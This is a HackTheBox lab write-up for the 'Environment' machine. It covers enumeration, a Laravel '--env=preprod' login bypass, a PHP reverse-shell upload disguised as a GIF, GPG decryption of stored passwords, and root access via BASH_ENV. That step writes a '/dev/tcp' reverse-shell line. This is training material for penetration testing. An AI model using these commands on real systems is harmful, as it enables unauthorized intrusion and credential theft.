+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">cd</span> /home/hish
+<span class="hljs-built_in">ls</span> -lah
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">total 36K
+drwxr-xr-x 5 hish hish 4.0K Apr 11 00:51 .
+drwxr-xr-x 3 root root 4.0K Jan 12  2025 ..
+lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
+-rw-r--r-- 1 hish hish 3.5K Jan 12  2025 .bashrc
+drwxr-xr-x 4 hish hish 4.0K Aug 28 22:19 .gnupg
+drwxr-xr-x 3 hish hish 4.0K Jan  6  2025 .<span class="hljs-built_in">local</span>
+-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
+drwxr-xr-x 2 hish hish 4.0K Jan 12  2025 backup
+-rw-r--r-- 1 root hish   33 Aug 28 15:11 user.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">cat</span> user.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-comment"># 64c2d3&lt;REDACTE&gt;&gt;</span>
+</code></pre></div>
+<p>Shell upgrade:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>python</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="python block, horizontally scrollable"><code class="hljs language-python">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
+</code></pre></div>
+<p>Backup contains encrypted files:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">/home/hish/backup/keyvault.gpg
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">file keyvault.gpg 
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .
+</code></pre></div>
+<hr/>
+<h3 id="section-keyvault-decryption"><a href="#section-keyvault-decryption" class="heading-link">KeyVault Decryption</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">export</span> HOME=/tmp
+<span class="hljs-built_in">cp</span> -r .gnupg/ /tmp
+gpg --decrypt keyvault.gpg
+</code></pre></div>
+<p>Results:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>gpg: WARNING: unsafe permissions on homedir &#x27;/tmp/.gnupg&#x27;
+gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
+      &quot;hish_ &lt;hish@environment.htb&gt;&quot;
+PAYPAL.COM -&gt; Ihaves0meMon$yhere123
+ENVIRONMENT.HTB -&gt; marineSPm@ster!!
+FACEBOOK.COM -&gt; summerSunnyB3ACH!!
+</code></pre></div>
+<p>SSH login:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ssh hish@environment.htb
+Password: marineSPm@ster!!
+</code></pre></div>
+<hr/>
+<h3 id="section-privilege-escalation"><a href="#section-privilege-escalation" class="heading-link">Privilege Escalation</a></h3>
+<h4 id="section-sudo-permissions"><a href="#section-sudo-permissions" class="heading-link">Sudo Permissions</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">sudo</span> -l
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">Matching Defaults entries <span class="hljs-keyword">for</span> hish on environment:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=<span class="hljs-string">&quot;ENV BASH_ENV&quot;</span>, use_pty
+
+User hish may run the following commands on environment:
+    (ALL) /usr/bin/systeminfo
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">cat</span> /usr/bin/systeminfo
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Displaying kernel ring buffer logs (dmesg) ###&quot;</span>
+dmesg | <span class="hljs-built_in">tail</span> -n 10
+
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Checking system-wide open ports ###&quot;</span>
+ss -antlp
+
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Displaying information about all mounted filesystems ###&quot;</span>
+mount | column -t
+
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Checking system resource limits ###&quot;</span>
+<span class="hljs-built_in">ulimit</span> -a
+
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Displaying loaded kernel modules ###&quot;</span>
+lsmod | <span class="hljs-built_in">head</span> -n 10
+
+<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n### Checking disk usage for all filesystems ###&quot;</span>
+<span class="hljs-built_in">df</span> -h
+</code></pre></div>
+<h4 id="section-bashenv-exploit"><a href="#section-bashenv-exploit" class="heading-link">BASH_ENV Exploit</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.99/4444 0&gt;&amp;1&#x27;</span> &gt; /tmp/root.sh
+<span class="hljs-built_in">chmod</span> +x /tmp/root.sh
+<span class="hljs-built_in">export</span> BASH_ENV=/tmp/root.sh
+<span class="hljs-built_in">sudo</span> /usr/bin/systeminfo
+</code></pre></div>
+<p>Root shell:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash"><span class="hljs-built_in">cd</span> /root
+<span class="hljs-built_in">ls</span>
+<span class="hljs-built_in">cat</span> root.txt
+<span class="hljs-comment"># 50c4fe&lt;REDACTED&gt;</span>
+</code></pre></div>
+<hr/>
+<h2 id="section-conclusions"><a href="#section-conclusions" class="heading-link">Conclusions</a></h2>
+<ul>
+<li>
+<p>The box is based on <strong>Laravel + Nginx</strong>, typical for modern PHP web applications, providing both MVC architecture and built-in routing/middleware.</p>
+</li>
+<li>
+<p><strong>User access</strong>: direct login bypass via the <code>preprod</code> environment variable, highlighting improper environment separation and potential misconfigurations in pre-production settings.</p>
+</li>
+<li>
+<p><strong>File upload</strong>: image upload functionality could be exploited to achieve a reverse shell, emphasizing the importance of proper file validation, MIME type checks, and server-side restrictions.</p>
+</li>
+<li>
+<p><strong>Privilege Escalation</strong>: the <code>BASH_ENV</code> environment variable could be abused with a modifiable script, showing how environment variables and sudo permissions can lead to root access if not carefully managed.</p>
+</li>
+<li>
+<p><strong>KeyVault PGP</strong>: decrypting the KeyVault revealed sensitive credentials, underlining the risk of storing secrets unprotected or with weak access control.</p>
+</li>
+</ul></div><dialog class="reader-image-dialog" aria-label="Enlarged article image"><button type="button" class="reader-image-close" aria-label="Close image"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></dialog></div></div></div></main></div><!--/$--></div></div><script id="article-data" type="application/json">{"kind":"writeup","entry":{"id":"environment","title":"Environment","platform":"hackthebox","difficulty":"medium","os":"linux","tags":["Laravel","Nginx","File Upload","BASH_ENV","PGP"],"date":"2024-08-31","summary":"Laravel application with login bypass, file upload vulnerability, and privilege escalation via BASH_ENV exploitation.","contentPath":"environment.md","previewImage":"/assets/previews/writeup-environment.png","icon":"/assets/htb/environment.png","kind":"writeup","folder":"writeups","route":"boxes/hackthebox/environment"},"route":"boxes/hackthebox/environment","content":"# Environment - HackTheBox Writeup\n\n## 1. External Enumeration\n\n### TCP Scan\n\n```bash\nnmap -sV -sC -Pn -p- --min-rate=1000 -n -oN env_fullscan.txt 10.10.11.67\n```\n\n```bash\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey:\n|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)\n|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)\n80/tcp open  http    nginx 1.22.1\n|_http-title: Did not follow redirect to http://environment.htb\n|_http-server-header: nginx/1.22.1\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n---\n## 2. Web Enumeration\n\n### Manual Enumeration\n#### WhatWeb\n\n```bash\nwhatweb environment.htb\n```\n\n```bash\nhttp://environment.htb [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], HttpOnly[laravel_session], IP[10.10.11.67], Laravel, Script, Title[Save the Environment | environment.htb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], nginx[1.22.1]\n```\n\n#### Dirb (Folder Enumeration)\n\n```bash\ndirb http://environment.htb\n```\n\nFound directories:\n\n```bash\n/build/\n/build/assets/\n/storage/\n/storage/files/\n/vendor/\n/login\n/logout\n/mailing\n/up\n/upload\n/robots.txt\n/favicon.ico\n/index.php\n```\n\n#### FFUF (Subdomain Enumeration)\n\n```bash\nffuf -u http://10.10.11.67/ -H \"Host: FUZZ.environment.htb\" -w /usr/share/seclists/Discovery/DNS/ains-top1million-110000.txt -fs 169\n```\n\n```\n# No findings\n```\n\n---\n### Automated Audit (Not Relevant for Exploitation)\n\nThose scans reported minor issues like missing HttpOnly flags, inode leaks in robots.txt, and a client-side desync vulnerability.  \nThese findings were not used in the exploitation chain of this box, but I include them here as part of a complete enumeration methodology.\n\n#### Nikto\n\n```bash\nnikto -h http://environment.htb -Tuning x -Display V -o env_nikto.txt\n```\n\nMain results:\n\n```\n+ GET /: Cookie XSRF-TOKEN created without the httponly flag\n+ GET /: Uncommon header 'x-content-type-options' found, with contents: nosniff\n+ GET /: Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN\n+ GET /robots.txt: Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x678300c0 0x18\n+ GET /robots.txt: \"robots.txt\" retrieved but it does not contain any 'disallow' entries (which is odd).\n+ -3092: GET /login/: /login/: This might be interesting...\n```\n\n#### Burp Crawler \u0026 Audit\n\n- Vulnerabilities: **Client-side desync** via `/robots.txt`\n    \n- Description: POST smuggling, browser interprets the next request.\n    \n- Remediation: patch the server, close the connection properly or use HTTP/2.\n    \n- References: [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)\n\n---\n\n## 3. Exploitation\n\n### Login Page / CSRF\n\nTesting the parameters in the login we discovered that the \"remember\" parameter makes the app expose its source code:\n\n```\nPOST /login HTTP/1.1\nHost: environment.htb\n...\n_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF\u0026email=test%40c.com\u0026password=test\u0026remember=FUZZED\n```\n\n\n- All POST requests in Laravel require a **CSRF token** (`_token`)\n    \n- POST without token → 419 Page Expired\n    \n- Token regenerated on every failed request\n    \n- `remember` parameter can expose source code\n\n\n### Bypass Login\n\nWe found that the `preprod` environment variable allows direct login.\n\nWith interception enabled, we can bypass login using the following request:\n\n```http\nPOST /login?--env=preprod HTTP/1.1\nHost: environment.htb\n...\n_token=g97unpa8CkocqX66zo4XDqkud8s80P898pqGFfaF\u0026email=test%40c.com\u0026password=test\u0026remember=True\n```\n\nAccessed: `http://environment.htb/management/dashboard`\n\n\n---\n\n### File Upload (Reverse Shell)\n\n- Endpoint: `/management/profile`\n\n    \n- Bypass image restrictions:\n\n```\nEstensione: rev.php.\nContent-Type: image/gif\nMagic bytes: GIF89a\n```\n\n\nListener:\n\n```bash\nnc -nvlp 1234\n```\n\n---\n\n### User Shell (hish)\n\n```bash\ncd /home/hish\nls -lah\n```\n\n```bash\ntotal 36K\ndrwxr-xr-x 5 hish hish 4.0K Apr 11 00:51 .\ndrwxr-xr-x 3 root root 4.0K Jan 12  2025 ..\nlrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -\u003e /dev/null\n-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout\n-rw-r--r-- 1 hish hish 3.5K Jan 12  2025 .bashrc\ndrwxr-xr-x 4 hish hish 4.0K Aug 28 22:19 .gnupg\ndrwxr-xr-x 3 hish hish 4.0K Jan  6  2025 .local\n-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile\ndrwxr-xr-x 2 hish hish 4.0K Jan 12  2025 backup\n-rw-r--r-- 1 root hish   33 Aug 28 15:11 user.txt\n```\n\n```bash\ncat user.txt\n```\n\n```bash\n# 64c2d3\u003cREDACTE\u003e\u003e\n```\n\nShell upgrade:\n\n```python\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```\n\nBackup contains encrypted files:\n\n```bash\n/home/hish/backup/keyvault.gpg\n```\n\n```bash\nfile keyvault.gpg \n```\n\n```bash\nkeyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .\n```\n\n---\n\n### KeyVault Decryption\n\n```bash\nexport HOME=/tmp\ncp -r .gnupg/ /tmp\ngpg --decrypt keyvault.gpg\n```\n\nResults:\n\n```\ngpg: WARNING: unsafe permissions on homedir '/tmp/.gnupg'\ngpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11\n      \"hish_ \u003chish@environment.htb\u003e\"\nPAYPAL.COM -\u003e Ihaves0meMon$yhere123\nENVIRONMENT.HTB -\u003e marineSPm@ster!!\nFACEBOOK.COM -\u003e summerSunnyB3ACH!!\n```\n\nSSH login:\n\n```bash\nssh hish@environment.htb\nPassword: marineSPm@ster!!\n```\n\n---\n\n### Privilege Escalation\n\n#### Sudo Permissions\n\n```bash\nsudo -l\n```\n\n```bash\nMatching Defaults entries for hish on environment:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    env_keep+=\"ENV BASH_ENV\", use_pty\n\nUser hish may run the following commands on environment:\n    (ALL) /usr/bin/systeminfo\n```\n\n```bash\ncat /usr/bin/systeminfo\n```\n\n\n```bash\n#!/bin/bash\necho -e \"\\n### Displaying kernel ring buffer logs (dmesg) ###\"\ndmesg | tail -n 10\n\necho -e \"\\n### Checking system-wide open ports ###\"\nss -antlp\n\necho -e \"\\n### Displaying information about all mounted filesystems ###\"\nmount | column -t\n\necho -e \"\\n### Checking system resource limits ###\"\nulimit -a\n\necho -e \"\\n### Displaying loaded kernel modules ###\"\nlsmod | head -n 10\n\necho -e \"\\n### Checking disk usage for all filesystems ###\"\ndf -h\n```\n\n#### BASH_ENV Exploit\n\n```bash\necho 'bash -i \u003e\u0026 /dev/tcp/10.10.14.99/4444 0\u003e\u00261' \u003e /tmp/root.sh\nchmod +x /tmp/root.sh\nexport BASH_ENV=/tmp/root.sh\nsudo /usr/bin/systeminfo\n```\n\nRoot shell:\n\n```bash\ncd /root\nls\ncat root.txt\n# 50c4fe\u003cREDACTED\u003e\n```\n\n---\n\n## Conclusions\n\n- The box is based on **Laravel + Nginx**, typical for modern PHP web applications, providing both MVC architecture and built-in routing/middleware.\n\n- **User access**: direct login bypass via the `preprod` environment variable, highlighting improper environment separation and potential misconfigurations in pre-production settings.\n\n- **File upload**: image upload functionality could be exploited to achieve a reverse shell, emphasizing the importance of proper file validation, MIME type checks, and server-side restrictions.\n\n- **Privilege Escalation**: the `BASH_ENV` environment variable could be abused with a modifiable script, showing how environment variables and sudo permissions can lead to root access if not carefully managed.\n\n- **KeyVault PGP**: decrypting the KeyVault revealed sensitive credentials, underlining the risk of storing secrets unprotected or with weak access control."}</script>
+    
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "6090182987b5451bb264dcd59cd2b600"}'></script>
+  </body>
+</html>
